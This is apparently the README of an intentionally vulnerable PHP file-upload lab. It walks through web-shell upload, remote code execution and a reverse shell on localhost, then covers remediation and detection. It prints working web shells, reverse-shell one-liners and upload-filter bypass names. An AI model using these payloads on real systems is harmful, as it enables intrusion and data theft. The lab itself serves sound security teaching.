# Xcerberus File Portal — PHP RCE Lab (CWE-434)

> **Author:** Goutham Chitti · offensive-security engineer · [github.com/gouthamchitti](https://github.com/gouthamchitti)

A small, deliberately-vulnerable PHP web app for **learning and teaching** one of the most
common critical web flaws: an **unrestricted file upload** that leads to **remote code
execution (RCE)** and a full **reverse shell**.

It is built to be stood up in minutes **on a virtual machine you own**, attacked end-to-end
with common tools, and then **fixed** — so you can recognise this class of bug and shut it
down in real systems.

> ⚠️ **Authorised use only.** Run this **only** on a machine/VM you own or are explicitly
> authorised to test, on an isolated network (localhost / host-only). It is intentionally
> insecure — never expose it to the internet or a shared network. All "customer" data here is
> **synthetic**. See [SECURITY & ETHICS](#security--ethics).

Accompanies the video **"Critical PHP RCE → Remote Shell"** and the full
**pentest report** (`Xcerberus_File_Portal_Pentest_Report.pdf`).

---

## What you get

| Path | What it is |
|------|------------|
| `app/index.php` | Staff login page |
| `app/portal.php` | Support **document upload** — *the vulnerable handler (CWE-434)* |
| `app/uploads/` | Web-served upload directory (where the web shell lands) |
| `confidential/customers_pii.csv` | Planted **synthetic** "customer data" (impact target) |
| `setup.sh` | One-command local run (PHP built-in server) |
| `hardened/portal.php` | The **fixed** handler, for the before/after lesson |

**The whole lab in one line:** a login, a document-upload feature, a planted file of fake
customer records, and (your) attacker shell.

---

## 1. Recreate it — choose your path

Credentials (lab): **`support` / `Xcerberus@Support2026`**. The app listens on **127.0.0.1:8080**.

### Path A — Quickest: PHP built-in server (any Linux/macOS VM)

```bash
# in a VM you own
sudo apt-get update && sudo apt-get install -y php-cli    # Debian/Ubuntu
# (Fedora: sudo dnf install php-cli   |   macOS: brew install php)

git clone https://github.com/gouthamchitti/xcerberus-file-portal-lab.git
cd xcerberus-file-portal-lab
./setup.sh           # starts: php -S 127.0.0.1:8080 -t app
# open http://127.0.0.1:8080/  → log in → you'll see the upload portal
```

### Path B — Realistic: Nginx + PHP-FPM (Ubuntu VM)

```bash
sudo apt-get update
sudo apt-get install -y nginx php-fpm
sudo cp -r app /var/www/xcerberus-portal        # webroot = /var/www/xcerberus-portal
sudo chown -R www-data:www-data /var/www/xcerberus-portal
```

Create `/etc/nginx/sites-available/xcerberus` (note: this mirrors the **vulnerable** config —
the upload dir executes PHP, which is the whole point of the lab):

```nginx
server {
    listen 127.0.0.1:8080;
    root /var/www/xcerberus-portal;
    index index.php;

    location / { try_files $uri $uri/ =404; }

    # VULNERABLE on purpose: PHP is executed everywhere under the webroot,
    # including uploads/. The remediation (below) removes exactly this.
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php-fpm.sock;   # match your PHP-FPM version
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/xcerberus /etc/nginx/sites-enabled/xcerberus
sudo nginx -t && sudo systemctl reload nginx
# place confidential/ somewhere readable by www-data to mirror the impact step
```

### Path C — Docker (self-contained)

```bash
docker run --rm -p 127.0.0.1:8080:80 \
  -v "$PWD/app":/var/www/html php:8.3-apache
# Apache serves app/ and executes uploads/*.php — same vulnerable behaviour
```

---

## 2. Attack it — the full chain

Everything targets `http://127.0.0.1:8080` on your own box. Tools: `nmap`, `whatweb`,
`nikto`, `curl`, `socat`/`nc` — all standard.

### Recon
```bash
nmap -sV -p8080 127.0.0.1           # → "PHP cli server ... (PHP 8.3.6)"  (version disclosure)
whatweb http://127.0.0.1:8080/       # → PHP[8.3.6], X-Powered-By[PHP/8.3.6], login title
nikto -host 127.0.0.1 -port 8080     # → missing X-Frame-Options, PHPSESSID w/o HttpOnly, version leak
```

### Exploit — upload a web shell, then run commands
```bash
# 1) authenticate (save the session cookie)
curl -s -c c.txt -d 'username=support&password=Xcerberus@Support2026' http://127.0.0.1:8080/index.php

# 2) a minimal PHP command-runner, uploaded as a "document" (no type check = CWE-434)
printf '%s' '<?php system($_GET["c"]); ?>' > note.php
curl -s -b c.txt -F 'doc=@note.php' http://127.0.0.1:8080/portal.php

# 3) request the uploaded file = code execution on the server
curl -s 'http://127.0.0.1:8080/uploads/note.php?c=id'
#   → uid=...(www-data/azureuser)...   REMOTE CODE EXECUTION
```

### Upgrade to an interactive reverse shell
```bash
# attacker listener (terminal A)
socat TCP-LISTEN:4444,bind=127.0.0.1,reuseaddr -      # or: nc -lvnp 4444

# trigger the connect-back through the web shell (terminal B)
RS='bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"'
curl -s -G http://127.0.0.1:8080/uploads/note.php --data-urlencode "c=$RS"

# back in terminal A you now have a shell:
whoami; id; hostname
cat ~/xcerberus-file-portal-lab/confidential/customers_pii.csv   # impact: data read (synthetic)
ip -brief addr                                              # pivot surface
```

**Common payload variants** (all equivalent RCE, useful for understanding detections):
- Web shell: `<?php system($_GET['c']); ?>` · `<?php echo shell_exec($_GET['c']); ?>` · `<?php passthru($_GET['c']); ?>`
- Reverse shell: `bash -i >& /dev/tcp/HOST/PORT 0>&1` · `php -r '$s=fsockopen("HOST",PORT);exec("sh <&3 >&3 2>&3");'` · `nc -e /bin/sh HOST PORT`
- Upload-filter bypasses you should test your fix against: `shell.php.jpg`, `shell.pHp`, `shell.phtml`, `shell.php%00.jpg`, content-type spoofing, magic-byte prefix (`GIF89a;<?php ...`).

---

## 3. Fix it — remediation

Fix the **class**, not just this file. The corrected handler is in
[`hardened/portal.php`](hardened/portal.php). Core changes:

1. **Validate by real content**, not filename — inspect magic bytes (`finfo`), allow-list only
   the formats you need (PNG/JPG/PDF/TXT/LOG), reject everything else.
2. **Never trust the client filename** — generate a random server-side name; set the extension
   from the validated type.
3. **Store uploads outside the webroot**; serve them back only as an inert
   `Content-Disposition: attachment` download.
4. **Disable execution** in the upload path — `php_admin_flag engine off` (Apache) / no PHP
   `location` for that dir (Nginx).
5. **Harden PHP** — `disable_functions = system,exec,shell_exec,passthru,proc_open,popen`;
   least-privilege runtime; `open_basedir`.
6. **Egress filtering** — default-deny outbound from web hosts; this alone kills the reverse shell.
7. **Patch management** — treat PHP RCEs as emergency patches (e.g. track **CVE-2026-6722**,
   a critical PHP SOAP use-after-free class) and virtual-patch at the WAF until rollout completes.

## 4. Detect it — blue-team telemetry

- Web log: an upload `POST /portal.php` followed by requests to a **new `.php` in `uploads/`**,
  and `?c=` / `?cmd=` with shell syntax in query strings.
- FIM: a new executable script appears in the writable upload directory.
- Process: the web process (`php`/`php-fpm`) **spawning `bash`/`sh`/`curl`/`socat`**.
- Network: **unexpected outbound TCP** from the web host (the reverse-shell connect-back).

---

## Security & ethics

- **Authorised, isolated use only.** Only run against systems you own or are explicitly
  permitted to test. Keep it on localhost / host-only networking. Do not expose it.
- **Synthetic data only.** Every name, email, phone and card digit in `confidential/` is
  fabricated for demonstration.
- **Why this is public:** defenders learn an attack best by running it safely once. Every
  offensive step here is paired with its detection signal and its fix. Use it to harden real
  systems — nothing else.

## Author & credits

Designed, built, and documented by **Goutham Chitti** — offensive-security engineer.
The vulnerable application, the hardened fix, the end-to-end attack walkthrough, the
accompanying video, and the pentest report are all my own work.

Connect / more work: [github.com/gouthamchitti](https://github.com/gouthamchitti)

## License
MIT (code) — see `LICENSE`. Educational/defensive use. No warranty. © 2026 Goutham Chitti.
